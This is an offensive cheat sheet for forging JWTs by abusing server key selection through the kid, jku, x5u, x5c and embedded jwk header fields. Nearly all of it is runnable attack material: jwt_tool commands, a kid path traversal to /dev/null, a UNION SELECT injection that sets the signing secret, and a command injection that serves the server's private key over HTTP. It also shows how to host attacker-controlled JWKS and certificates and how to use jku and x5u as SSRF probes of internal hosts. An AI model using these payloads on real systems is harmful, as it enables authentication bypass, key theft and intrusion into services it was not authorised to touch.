# Abuse server key selection (kid / jku / x5u / jwk) — Open WHEN: a captured JWT header carries a kid, jku, x5u, x5c, or embedded jwk and you need the exact injection strings to force your own verification key

The body lists these as concepts. Here are the runnable forges and exact injection strings to make the server pick a key you control.

## kid — path traversal to a predictable-content file
Point `kid` at a file whose content you know, then HMAC-sign with that content as the secret.
```bash
# /dev/null is empty -> empty HMAC secret
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../../../../../dev/null" -S hs256 -p ""
# this file reliably contains "2" on Linux -> use 2 as the secret
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```
Brittle file-key trick: build an HS256 key with JWK `k` set to `AA==`, set `kid` to a `/dev/null` traversal — some libs treat the empty file as a valid HMAC secret.
Also search the web root for the literal `kid` path (e.g. `kid:"key/12345"` -> request `/key/12345` and `/key/12345.pem`) to read the real key.

## kid — SQL injection in the key lookup
If `kid` feeds a DB query that returns the signing secret, inject a row that returns a secret you choose, then sign with that literal:
```sql
non-existent-index' UNION SELECT 'ATTACKER';-- -
```
Now the signing secret is the string `ATTACKER`. Fuzz `kid` with a vector file:
```bash
python3 jwt_tool.py -t https://tgt/ -rc "jwt=<JWT>" -I -hc kid -hv custom_sqli_vectors.txt
```

## kid — OS command injection
If `kid` lands in a shell/file-path execution context, inject to exfiltrate the real private key:
```
/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&
```

## jku — point JWKS fetch at a host you control (CVE-2018-0114 family)
First probe whether the verifier fetches remotely (any callback = SSRF-style fetch):
```bash
python3 jwt_tool.py <JWT> -X s                              # uses jwtconf.ini JWKS location
python3 jwt_tool.py <JWT> -X s -ju http://collab.tgt/jwks.json
```
Generate your keypair and host a JWKS at the `jku` URL, then sign with your private key:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Extract `n`/`e` for the JWKS you serve:
```python
from Crypto.PublicKey import RSA
key = RSA.importKey(open("publickey.crt").read())
print("n:", hex(key.n)); print("e:", hex(key.e))
```
Forged-header shape (your `kid` must match the `kid` in the JWKS you host):
```json
{"typ":"JWT","alg":"RS256","jku":"https://collab.tgt/jwks.json","kid":"id_of_jwks"}
```
Common live JWKS endpoints to grab a real key/format from: `/jwks.json` `/.well-known/jwks.json` `/openid/connect/jwks.json` `/api/keys` `/api/v1/keys` `/{tenant}/oauth2/v1/certs`.

## x5u / x5c — X.509 URL or embedded chain
Same idea as `jku` but an X.509 cert. Mint a self-signed cert, host it (x5u) or inline it base64 (x5c):
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
openssl x509 -in attacker.crt -text          # read n/e/x5t to also patch those header fields
```
Set `x5u` to your hosted `.crt` (or paste the base64 DER into `x5c`), fix `n`/`e`/`x5t`, sign with `attacker.key`. Both `jku` and `x5u` double as SSRF gadgets — swap the URL for an internal host to probe.

## jwk — embed your own public key in the header (CVE-2018-0114, node-jose < 0.11.0)
Library trusts a JWK inline in the header. Strip the original sig, add your public JWK, sign with your private key:
```bash
python3 jwt_tool.py <JWT> -X i
```
Burp JWT Editor: New RSA Key -> edit data -> Attack -> Embedded JWK. Resulting header:
```json
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","kid":"jwt_tool","use":"sig","e":"AQAB","n":"<your-modulus>"}}
```

## Rebuild a usable public key from leaked n/e (for confusion/embedding)
```js
const NodeRSA = require('node-rsa');
const key = new NodeRSA();
const imported = key.importKey({n: Buffer.from(n,'base64'), e: Buffer.from(e,'base64')}, 'components-public');
console.log(imported.exportKey("public"));
```
